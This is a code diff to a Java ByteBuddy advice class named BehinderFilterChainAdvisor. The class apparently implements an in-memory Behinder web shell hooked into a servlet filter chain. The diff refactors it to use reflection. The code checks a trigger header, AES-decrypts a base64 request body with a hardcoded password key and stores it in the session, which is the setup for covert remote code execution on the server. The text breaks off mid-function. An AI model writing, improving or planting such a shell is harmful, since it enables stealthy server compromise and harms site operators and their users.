@@ -4,11 +4,7 @@ import net.bytebuddy.asm.Advice;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
+import java.io.BufferedReader;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
@@ -18,26 +14,22 @@ import java.util.Map;
  * @author ReaJason
  */
 public class BehinderFilterChainAdvisor {
-    public static String pass;
-    public static String headerName;
-    public static String headerValue;
 
     @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
     public static boolean enter(
-            @Advice.Argument(value = 0) ServletRequest req,
-            @Advice.Argument(value = 1) ServletResponse res
+            @Advice.Argument(value = 0) Object request,
+            @Advice.Argument(value = 1) Object res
     ) {
-        if (!(req instanceof HttpServletRequest)) {
-            return false;
-        }
-        HttpServletRequest request = (HttpServletRequest) req;
-        HttpServletResponse response = (HttpServletResponse) res;
+        String pass = "pass";
+        String headerName = "headerName";
+        String headerValue = "headerValue";
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
+            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+            if (value != null
+                    && value.contains(headerValue)) {
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-
+                Object response = res;
                 Field field = null;
                 Class<?> clazz = obj.getClass();
                 while (clazz != Object.class) {
@@ -50,16 +42,18 @@ public class BehinderFilterChainAdvisor {
                 }
                 if (field != null) {
                     field.setAccessible(true);
-                    response = (HttpServletResponse) field.get(obj);
+                    response = field.get(response);
                 }
                 obj.put("response", response);
+                Object session = request.getClass().getMethod("getSession").invoke(request);
+                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                 obj.put("session", session);
-                session.setAttribute("u", pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                 byte[] data = null;
                 Class<?> base64;
-                String parameter = req.getReader().readLine();
+                BufferedReader reader = (BufferedReader) request.getClass().getMethod("getReader").invoke(request);
+                String parameter = reader.readLine();
                 try {
                     base64 = Class.forName("java.util.Base64");
                     Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
